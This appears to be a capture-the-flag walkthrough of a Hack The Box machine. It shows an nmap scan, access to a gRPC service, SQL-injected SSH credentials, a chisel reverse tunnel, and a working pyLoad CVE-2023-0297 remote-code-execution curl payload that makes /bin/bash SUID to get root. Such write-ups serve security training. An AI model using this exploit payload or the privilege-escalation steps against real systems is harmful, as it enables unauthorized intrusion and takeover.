Nmap reveals a strange port that is open, accessing the webpage does not reveal anything.

```
└──╼ [★]$ nmap -sC -A -T4 -p- -Pn 10.129.85.76
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-07 20:42 BST
Nmap scan report for 10.129.85.76
Host is up (0.0044s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 91bf44edea1e3224301f532cea71e5ef (RSA)
|   256 8486a6e204abdff71d456ccf395809de (ECDSA)
|_  256 1aa89572515e8e3cf180f542fd0a281c (ED25519)
50051/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
```

Attempting to connect to it does give us a hint.
```
└──╼ [★]$ telnet 10.129.85.76 50051
Trying 10.129.85.76...
Connected to 10.129.85.76.
Escape character is '^]'.
?�?� ?@Did not receive HTTP/2 settings before handshake timeoutConnection closed by foreign host.
```

After some googling I learned that it was a grpc server and we can access that by installing the gui.

https://github.com/fullstorydev/grpcui
```
└──╼ [★]$ go install github.com/fullstorydev/grpcui/cmd/grpcui@latest
```
```
└──╼ [★]$ chmod -R 777 go/
```
```
└──╼ [★]$ ./grpcui -plaintext 10.129.94.151:50051
gRPC Web UI available at http://127.0.0.1:32953/
```
After installing and running the program we are greeted with a page.

Using default credentials works but it does not get us anywhere.

![image](https://github.com/Rogue-1/HTB/assets/105310322/1798d19a-54b0-47d8-8efa-4114f991063c)

![image](https://github.com/Rogue-1/HTB/assets/105310322/e08a1923-efe7-4dcc-81f0-d6052dcd9eca)

However in the getinfo section we can see that it may be vulnerable to sql injection based on the errors.

![image](https://github.com/Rogue-1/HTB/assets/105310322/6a096f4e-55c8-41a7-b58a-7a4ca47692dd)

After alot of messing around we finally get some data back with usernames and passwords to log in through ssh as sau - HereIsYourPassword1431

![image](https://github.com/Rogue-1/HTB/assets/105310322/cf957875-1695-4199-b76c-70173edc6386)

![image](https://github.com/Rogue-1/HTB/assets/105310322/e2c71132-d908-40ab-b22d-19e60477e86b)


Login and grab the user flag.

```
└──╼ [★]$ ssh sau@10.129.94.151
sau@10.129.94.151's password: 
Last login: Mon May 15 09:00:44 2023 from 10.10.14.19
sau@pc:~$ id
uid=1001(sau) gid=1001(sau) groups=1001(sau)

sau@pc:~$ cat user.txt
474dded2************************
```

After logging in I ran linpeas and noticed port 8000 was open.

Transfer chisel to the victim and run it to access the webpage on our host computer.

```
└──╼ [★]$ chisel server --reverse --port 1234
2023/07/11 22:04:39 server: Reverse tunnelling enabled
2023/07/11 22:04:39 server: Fingerprint izTDIgf3pIe+DypOlVdLmutBd4Tj0fu+cuNRh3rvtyM=
2023/07/11 22:04:39 server: Listening on http://0.0.0.0:1234
2023/07/11 22:04:40 server: session#1: tun: proxy#R:8000=>8000: Listening

sau@pc:/dev/shm$ ./chisel client 10.10.14.31:1234 R:8000:127.0.0.1:8000
2023/07/11 21:04:15 client: Connecting to ws://10.10.14.31:1234
```

We are greeted with a login page for pyload but none of the credentials we have work. Luckily a quick google search for pyload vulnerabilites shows that there is a CVE for it.

![image](https://github.com/Rogue-1/HTB/assets/105310322/010ff159-666f-4e78-a64d-11f764d553d9)

https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad

Create a simple priv esc bash script

```
#!/bin/bash

chmod u+s /bin/bash
```

Modify the payload to access your bash script.

Running the script may appear to fail but if you check it you can see that it was successful.

```
└──╼ [★]$ curl -i -s -k -X $'POST'     --data-binary $'jk=pyimport%20os;os.system(\"bash%20/dev/shm/bash.sh\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa'     $'http://127.0.0.1:8000/flash/addcrypted2'
HTTP/1.1 500 INTERNAL SERVER ERROR
Content-Type: text/html; charset=utf-8
Content-Length: 21
Access-Control-Max-Age: 1800
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: OPTIONS, GET, POST
Vary: Accept-Encoding
Date: Tue, 11 Jul 2023 21:27:37 GMT
Server: Cheroot/8.6.0

Could not decrypt key
```

```
sau@pc:/dev/shm$ ./chisel client 10.10.14.31:1234 R:8000:127.0.0.1:8000
2023/07/11 21:27:21 client: Connecting to ws://10.10.14.31:1234
2023/07/11 21:27:21 client: Connected (Latency 3.771334ms)
^C2023/07/11 21:27:40 client: Disconnected
2023/07/11 21:27:40 client: Give up
sau@pc:/dev/shm$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash

```

After everything works out you can grab the root flag!

```
sau@pc:/dev/shm$ bash -p
bash-5.0# cat /root/root.txt
d54654ee************************
```
